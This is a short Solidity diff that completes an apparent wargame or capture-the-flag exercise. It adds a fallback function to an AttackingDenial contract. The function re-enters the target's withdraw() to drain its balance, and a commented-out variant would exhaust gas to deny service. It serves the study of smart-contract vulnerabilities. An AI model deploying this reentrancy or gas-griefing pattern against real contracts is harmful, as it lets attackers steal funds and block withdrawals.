@@ -9,5 +9,17 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    fallback() external payable {
+        Denial target = Denial(contractAddress);
+
+        // Run until balance gets to zero
+        if (payable(contractAddress).balance > 0) {
+            target.withdraw();
+        }
+
+        // Run until gas depletion
+        // if (true) {
+        //     target.withdraw();
+        // }
+    }
 }
